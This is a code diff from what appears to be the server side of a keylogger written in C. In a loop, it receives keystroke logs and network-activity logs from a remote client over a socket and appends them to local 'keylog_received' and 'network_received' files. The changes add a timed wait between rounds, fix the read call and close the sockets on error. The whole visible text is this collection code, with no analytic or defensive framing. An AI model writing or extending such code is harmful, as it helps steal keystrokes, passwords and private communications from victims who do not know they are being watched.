@@ -56,26 +56,30 @@ int main()
     
     /*** Reading from Client and writing to local files* ***/
     while(1){
+        sleep(178); //wait for the client to execute again
         memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
         /*Open keylog files for printing*/
         FILE *keylog_log = fopen("log/keylog_received.txt", "a");
         /*Receive a keylog file from the client*/
-        if ((read_size = read(csock, &rec_buffer, sizeof(rec_buffer))) > 0) {
+        if ((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0) {
             fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), keylog_log);
         } else {
             perror("Error receiving keylog log\n");
+            close(csock);
+            close(ssock);
         }
         fclose(keylog_log);
-        
         
         memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
         /*Open network log file for printing*/
         FILE *network_log = fopen("log/network_received.txt", "a");
         /*Receive network log file*/
-        if ((read_size = read(csock, &rec_buffer, sizeof(rec_buffer))) > 0) {
+        if ((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0) {
             fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), network_log);
         } else {
             perror("Error receiving network log\n");
+            close(csock);
+            close(ssock);
         }
         fclose(network_log);
         
